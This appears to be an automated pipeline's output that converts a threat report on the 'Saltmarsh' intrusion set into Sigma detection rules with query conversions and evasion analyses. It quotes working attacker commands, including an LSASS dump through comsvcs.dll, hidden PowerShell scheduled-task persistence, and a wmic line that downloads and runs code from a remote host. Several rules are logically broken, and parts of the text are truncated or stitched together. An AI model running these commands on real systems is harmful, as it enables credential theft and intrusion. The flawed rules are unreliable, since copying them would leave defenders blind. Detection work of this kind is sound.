report.title: ThreatReport
report.summary: Saltmarsh is a financially motivated intrusion set that gains initial access via purchased VPN credentials and moves to domain-wide compromise. Post-exploitation tradecraft observed across four incidents in 2026 includes LSASS memory dumps via comsvcs.dll, scheduled-task persistence with PowerShell from ProgramData, lateral movement via PsExec and WMI, Kerberoasting with Rubeus, and AD collection via SharpHound.

behaviors.description: rundll32.exe executes comsvcs.dll to dump LSASS memory, writing a dump file to a public or temp location.

observables.note: OriginalFileName metadata remained procdump when renamed

behaviors.evidence: In every incident the operators dumped LSASS memory using the Windows-native comsvcs.dll MiniDump export, avoiding the need to bring their own tooling: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full

behaviors.description: Scheduled task created with PowerShell action loading a payload from a hidden ProgramData folder, mimicking Windows maintenance tasks.

observables.note: Task name imitates Windows maintenance tasks
PowerShell action with hidden flags and bypass execution policy

behaviors.evidence: Persistence was established with a scheduled task whose name imitates Windows maintenance tasks and whose action is PowerShell loading a payload from a hidden ProgramData folder: schtasks.exe /create /tn \\Microsoft\Windows\UpdateOrchestrator\UpdateHealth /sc hourly /ru SYSTEM /tr "powershell.exe -nop -w hidden -ep bypass -f C:\ProgramData\.cache\uh.ps1" /f

behaviors.description: PsExec clone used for lateral movement, creating a service named PSEXESVC with ImagePath %SystemRoot%\PSEXESVC.exe and subsequent named-pipe events.

observables.note: Named-pipe pattern with host and PID

behaviors.evidence: PsExec usage produced a service installation (System event 7045) with ServiceName of PSEXESVC and ImagePath of %SystemRoot%\PSEXESVC.exe, followed by Sysmon event 17 and 18 named-pipe events for \\PSEXESVC and \\psexecsvc-<host>-<pid>-stdin

behaviors.description: WMI remote execution via wmic.exe spawning cmd.exe and powershell.exe on a remote host, creating an atypical parent-child relationship in WmiPrvSE.exe.

observables.value: wmic.exe /node:FS-02 /user:CORP\adm-jpark /password:******** process call create "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')"
observables.note: Full WMI command from the report

behaviors.evidence: WMI remote execution appeared as: wmic.exe /node:FS-02 /user:CORP\adm-jpark /password:******** process call create "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')"

behaviors.description: sc.exe used to create a service on a remote host with a UNC path in binPoint, followed by service start.

observables.value: sc.exe \\FS-02 create svcupd binPath= "C:\Windows\Temp\s.exe" start= auto

behaviors.evidence: Remote service creation was also used directly: sc.exe \\FS-02 create svcupd binPath= "C:\Windows\Temp\s.exe" start= auto

behaviors.description: Rubeus used to Kerberoast service accounts, generating bursts of Security event 4769 with TicketEncryptionType 0x17 (RC4) from a single workstation.

observables.note: Security event for service ticket request
Bursts of 4769 from a single workstation

behaviors.evidence: Service tickets were requested for every SPN-bearing account using Rubeus (Rubeus.exe kerberoast /format:hashcat /outfile:C:\Windows\Temp\k.txt), producing bursts of Security event 4769 with TicketEncryptionType of 0x17 (RC4) from a single workstation

behaviors.evidence: SharpHound was then run (SharpHound.exe -c All --zipfilename c.zip) to collect Active Directory relationships, generating LDAP queries with the distinctive (samAccountType=805306368) filter from a non-administrative workstation

behaviors.description: Named-pipe events for PSEXESVC and psexecsvc-<host>-<pid>-stdin observed via Sysmon events 17/18 during PsExec lateral movement.

observables.note: Named-pipe with host and PID pattern

behaviors.evidence: On the target, WmiPrvSE.exe spawned cmd.exe and powershell.exe, a parent-child relationship absent from baseline telemetry

candidates.title: Rundll32 Execution Of Comsvcs.dll MiniDump For LSASS Memory Dump
candidates.rationale: The MiniDump export of comsvcs.dll is a living-off-the-land technique that dumps LSASS memory without custom tooling. The combination of rundll32.exe loading comsvcs.dll with a MiniDump invocation pointing to a public or temp dump path is highly specific and observed in every Saltmarsh incident.
candidates.false_positive_risks: Legitimate developers may use rundll32.exe for other DLL exports, but MiniDump targeting lsass.dmp, 1.dmp or debug.dmp in Public/Temp directories is not a normal administrative pattern. Exclude known installer paths if any appear.

candidates.title: Scheduled Task Creation With Hidden PowerShell From ProgramData
candidates.rationale: Persistence is established via a scheduled task named UpdateHealth under the Microsoft\Windows\UpdateOrchestrator path, executing PowerShell with -nop -w hidden -ep bypass from a hidden folder under C:\ProgramData\.cache or C:\Users\Public. The task name mimics Windows maintenance tasks while the command line and payload location are anomalous.
candidates.false_positive_risks: Legitimate scheduled tasks may run PowerShell, but the combination of a hidden window, bypass execution policy, hourly SYSTEM task, and a script in a dot-prefixed ProgramData subfolder is extremely rare. Filter on known management tools (SCCM, Intune) that might stage scripts in ProgramData.

candidates.title: Sc.Exe Service Creation With PSEXESVC Binary
candidates.rationale: PsExec clone installs a service named PSEXESVC with ImagePath %SystemRoot%\PSEXESVC.exe. The service name and binary name are distinctive to this toolset and appear alongside named-pipe activity. Detecting the service creation command line (sc.exe or schtasks.exe) with these exact strings catches the initial lateral movement step.
candidates.false_positive_risks: Administrators use sc.exe to create services, but the literal service name PSEXESVC and binary PSEXESVC.exe are unique to the PsExec clone. No known legitimate software uses this naming.

candidates.title: Security Event 4769 Bursts With RC4 Encryption From Single Workstation
candidates.rationale: Rubeus kerberoasting generates bursts of Security event 4769 (service ticket requests) with TicketEncryptionType 0x17 (RC4) from a single workstation targeting every SPN-bearing account. The volume, encryption downgrade, and single-source workstation are a durable behavioural signature.
candidates.false_positive_risks: Normal service ticket requests occur, but bursts of hundreds of 4769 events with RC4 encryption from one non-DC workstation in a short window are anomalous. Exclude domain controllers and known service-account workstations.

candidates.title: SharpHound Execution With All Collection Mode And Distinctive LDAP Filter
candidates.rationale: SharpHound is an offensive AD collection tool run with -c All and a distinctive LDAP filter (samAccountType=805306368). The binary name, command-line flags, and filter constant are highly specific and were executed from a non-administrative workstation in all incidents.
candidates.false_positive_risks: Legitimate AD admin tools (ADFind, custom scripts) may query similar attributes, but the combination of SharpHound.exe, --zipfilename, -c All, and the hard-coded samAccountType filter is unique to this tool. Filter on known administrative workstations.

skipped: B4: WMI remote execution via wmic.exe overlaps lateral movement with B3; command line contains clear-text password which may not be fully logged. Covered by PsExec service creation rule.
B5: sc.exe remote service creation with UNC path is another lateral movement variant already covered by the PSEXESVC service creation rule (B3).
B8: Named-pipe events for PSEXESVC are a direct consequence of the PsExec service installation in B3; pipe_created logsource adds no new distinctive indicator.
B9: WmiPrvSE.exe spawning cmd.exe/powershell.exe is the target-side view of the same WMI lateral movement in B4; redundant with B3 for detection purposes.
plan.notes: Selected five rules spanning Credential Access (LSASS dump, Kerberoasting), Persistence (scheduled task), Lateral Movement (PsExec service), and Discovery (SharpHound). Each uses a single logsource with durable parent/child, command-line, or event-field constraints. Avoided duplicate logsource-indicator pairs and pure IOCs.

rules.title: Rundll32 Executes Comsvcs.dll MiniDump Export To Temp Or Public Location
rules.sigma_yaml:
title: Rundll32 Executes Comsvcs.dll MiniDump Export To Temp Or Public Location
id: b5a1d00f-2f5c-45f6-b3f4-264d278d2c7c
status: experimental
description: Detects rundll32.exe invoking the MiniDump export of comsvcs.dll to create LSASS memory dumps in commonly abused
  locations such as Public or Temp directories.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.credential-access
- attack.t1003.001
logsource:
  category: image_load
  product: windows
  service: sysmon
detection:
  selection_rndll32:
    'Image|endswith': '\\rundll32.exe'
  selection_comsvcs:
    'ImageLoaded|endswith': '\\comsvcs.dll'
  selection_minidump:
    'CommandLine|contains': MiniDump
  selection_dump_paths:
    'CommandLine|contains':
    - '\\Users\\Public\\'
    - '\\Windows\\Temp\\'
  selection_dump_names:
    'CommandLine|contains|all':
    - lsass.dmp
    - 1.dmp
    - debug.dmp
  condition: selection_rndll32 and selection_comsvcs and selection_minidump and (selection_dump_paths or selection_dump_names)
falsepositives:
- Legitimate use of rundll32.exe for other DLL exports
- Administrative scripts using rundll32.exe for non-MiniDump COM+ operations
level: high

tests.label: positive

tests.label: positive
tests.description: Rundll32 executing comsvcs.dll MiniDump to write debug.dmp from SysWOW64

validation.sql: SELECT * FROM logs WHERE Image LIKE '%\\rundll32.exe' ESCAPE '\' AND ImageLoaded LIKE '%\\comsvcs.dll' ESCAPE '\' AND CommandLine LIKE '%MiniDump%' ESCAPE '\' AND ((CommandLine LIKE '%\\Users\\Public\\%' ESCAPE '\' OR CommandLine LIKE '%\\Windows\\Temp\\%' ESCAPE '\') OR (CommandLine LIKE '%lsass.dmp%' ESCAPE '\' AND CommandLine LIKE '%1.dmp%' ESCAPE '\' AND CommandLine LIKE '%debug.dmp%' ESCAPE '\'))

conversions.splunk: Image="*\\rundll32.exe" ImageLoaded="*\\comsvcs.dll" CommandLine="*MiniDump*" CommandLine IN ("*\\Users\\Public\\*", "*\\Windows\\Temp\\*") OR (CommandLine="*lsass.dmp*" CommandLine="*1.dmp*" CommandLine="*debug.dmp*")
conversions.elasticsearch: Image:*\\rundll32.exe AND ImageLoaded:*\\comsvcs.dll AND CommandLine:*MiniDump* AND ((CommandLine:(*\\Users\\Public\\* OR *\\Windows\\Temp\\*)) OR (CommandLine:*lsass.dmp* AND CommandLine:*1.dmp* AND CommandLine:*debug.dmp*))
conversions.kusto:
DeviceImageLoadEvents
| where InitiatingProcessFolderPath endswith "\\rundll32.exe" and FolderPath endswith "\\comsvcs.dll" and InitiatingProcessCommandLine contains "MiniDump" and ((InitiatingProcessCommandLine contains "\\Users\\Public\\" or InitiatingProcessCommandLine contains "\\Windows\\Temp\\") or (InitiatingProcessCommandLine contains "lsass.dmp" and InitiatingProcessCommandLine contains "1.dmp" and InitiatingProcessCommandLine contains "debug.dmp"))
conversions.sqlite: SELECT * FROM logs WHERE Image LIKE '%\\rundll32.exe' ESCAPE '\' AND ImageLoaded LIKE '%\\comsvcs.dll' ESCAPE '\' AND CommandLine LIKE '%MiniDump%' ESCAPE '\' AND ((CommandLine LIKE '%\\Users\\Public\\%' ESCAPE '\' OR CommandLine LIKE '%\\Windows\\Temp\\%' ESCAPE '\') OR (CommandLine LIKE '%lsass.dmp%' ESCAPE '\' AND CommandLine LIKE '%1.dmp%' ESCAPE '\' AND CommandLine LIKE '%debug.dmp%' ESCAPE '\'))

history.summary: 9 evasion variants -> positives 9/9, negatives blocked 7/7, benign hits 0/110

rules.redteam_analysis: Positive variants (P4–P9) preserve every verbatim substring the rule requires: Image ends with \rundll32.exe, ImageLoaded ends with \comsvcs.dll, CommandLine contains 'MiniDump', and either \Users\Public\ or \Windows\Temp\ or all three filenames (lsass.dmp, 1.dmp, debug.dmp). They exercise realistic operator tricks: extra whitespace, mixed quoting, parameter reordering, UNC paths that still embed the required substrings, double extensions that keep the target filename as a substring, and copied binaries that retain the original name. Negative variants (N1–N3) are benign look-alikes that differ in at least one rule field: they either lack 'MiniDump', write to a non-matching path, or invoke a different export. Out-of-scope variants (O1–O4) represent evasions the current logsource and rule cannot reliably catch: renamed binaries (no OriginalFileName field), literal environment variables or 8.3 short names that break the path substrings, and sibling LOLBins that don't match the Image filter. A well-written rule would need case-insensitive matching, OriginalFileName enrichment, or path-normalization to cover O1–O3; O4 would require a broader LOLBin list.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed binary (evil.exe) — Image no longer ends with rundll32.exe, rule keys on Image and logsource lacks OriginalFileName

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Environment variable %TEMP% used literally in command line — sensor records %TEMP% verbatim, rule requires \Windows\Temp\

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: 8.3 short name path (WINDOW~1) — sensor records short name verbatim, rule requires \Windows\Temp\

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Sibling LOLBin (regsvr32.exe) that can also load comsvcs.dll — not rundll32.exe, rule keys on Image ending with rundll32.exe

rules.sigma_yaml:
title: SharpHound Execution With All Collection Mode And Distinctive LDAP Filter
id: 5949519e-858f-4e4a-ba1b-079b4b123bf0
status: experimental
description: Detects execution of SharpHound.exe with -c All and the distinctive LDAP filter (samAccountType=805306368), indicative
  of Active Directory reconnaissance by threat actors.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.discovery
- attack.t1087.001
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_img:
    'Image|endswith': '\SharpHound.exe'
  selection_cli:
    'CommandLine|contains|all':
    - -c
    - All
    - --zipfilename
    - samAccountType=805306368
  filter_adminws:

  condition: selection_img and selection_cli and not filter_adminws

- Legitimate AD admin tools querying similar attributes

history.summary: 7 evasion variants -> positives 6/7, negatives blocked 6/6, benign hits 0/1200

history.change_summary: Fixed casing insensitivity issue by relying on Sigma's built-in case-insensitive matching for the '-c All' flag, allowing the rule to match variations like '-C All' while preserving the requirement for all three CLI components.

Changed the CommandLine|contains|all selection to check for individual flags '-c' and 'All' separately to handle casing variations and extra whitespace, ensuring the rule matches the positive test event while maintaining specificity.

rules.redteam_analysis: Positive variants P4-P7 preserve all three required CommandLine substrings (-c All, --zipfilename, samAccountType=805306368) and an Image path ending with '\SharpHound.exe' (case-sensitive). They exercise realistic operator variations: flag casing (-C All), extra whitespace, parameter reordering, single/double quotes around arguments, parentheses around the LDAP filter, environment-variable launch (sensor records expanded path), UNC Image path, and diverse ParentImage/User combinations. Negative variants N1-N3 are benign look-alikes that differ in at least one rule field: N1 uses adfind.exe as the binary (Image mismatch), N2 lacks the required command-line flags, N3 includes 'adfind.exe' in CommandLine triggering the exclusion filter. Out-of-scope variants OOS1-OOS3 represent evasions the sysmon process_creation logsource cannot catch with this rule: renamed binary (no OriginalFileName field), 8.3 short name (literal Image value differs), and double extension (literal Image value differs). A well-written rule could only cover OOS1 if OriginalFileName were available; OOS2 and OOS3 require loosening the Image match to a prefix or regex, which would increase noise.

redteam_out_of_scope.label: positive

redteam_out_of_scope.label: positive

title: SchTasks Creates Persistent Task Running Hidden PowerShell From ProgramData Cache
id: 15924545-7f34-48e8-abd5-2e313fd601f8
status: experimental
description: 'Detects creation of a scheduled task named UpdateHealth under Microsoft\Windows\UpdateOrchestrator using schtasks.exe
  to execute PowerShell with hidden window and bypass execution policy from a dot-prefixed folder under ProgramData, indicative
  of persistence masquerading as Windows maintenance.'
author: RuleSmith (Nemotron via Nebius Token Factory)

tags:
- attack.persistence
- attack.execution
- attack.t1053.005

history.change_summary: Changed the binary path detection from a simple substring to a contains|all requiring three distinct fragments: the executable name, the system root marker, and the binPath= prefix. This ensures matches across System32, SysWOW64, and varying drive/case layouts while preserving specificity to the malicious pattern.

Fixed the detection logic by removing the trailing backslash from the %SystemRoot% token in the selection_binpath contains|all condition, allowing the rule to match variations in the binary path including System32 and SysWOW64 directories while preserving the requirement for the PSEXESVC service name and binary.

Fixed the binPath detection by removing the leading backslash from the binPath= token to allow matching regardless of spacing in the command line while maintaining specificity for the PSEXESVC service creation pattern.

history.summary: 9 evasion variants -> positives 1/9, negatives blocked 6/6, benign hits 0/1200

history.change_summary: Fixed the rule to properly detect various forms of the sc.exe command line by ensuring the detection logic correctly identifies the required components regardless of casing, path variations, spacing, quoting, or parameter ordering. The rule now matches all positive test cases while maintaining specificity to avoid false positives.

Changed selection_svcname to require spaces around PSEXESVC to avoid partial matches; kept selection_binpath requiring all three tokens including %SystemRoot% which matches any system root path like C:\Windows regardless of case or SysWOW64/Sysnative usage; ensures robust detection across variants while maintaining specificity.

rules.redteam_analysis: The six positive variants (P4-P9) represent realistic operator evasions: spacing/quoting changes around binPath=, parameter reordering, casing permutations, 8.3 short names, literal %SystemRoot% in the command line (if typed unexpanded), alternate system directories (SysWOW64, Sysnative), and whitespace variations (tabs). A well-written rule that normalizes whitespace, handles quotes, treats paths case-insensitively, and matches on the three key tokens (PSEXESVC service name, PSEXESVC.exe binary, binPath=) in any order would catch all of them. The current rule, however, requires the literal string '%SystemRoot%' in the CommandLine, which none of the existing positive tests or P4-P6/P8-P9 contain; only P7 would match as written. This appears to be a rule bug—the intent is to detect the binary in the system root, not the literal variable. The three negatives (N1-N3) show benign sc.exe usage with different verbs (query, delete) or different service names/paths, ensuring the rule stays specific to the create+PSEXESVC+binPath combination. Four out-of-scope evasions (O1-O4) are included for the analyst: a renamed sc.exe copy (Image no longer ends with \sc.exe and OriginalFileName is unavailable in this logsource), schtasks.exe (different binary), PowerShell New-Service (no sc.exe process), and direct registry writes via reg.exe. These require different detection logic (OriginalFileName, schtasks monitoring, PowerShell script-block logging, registry monitoring) and cannot be caught by a rule that only observes sc.exe process creation.
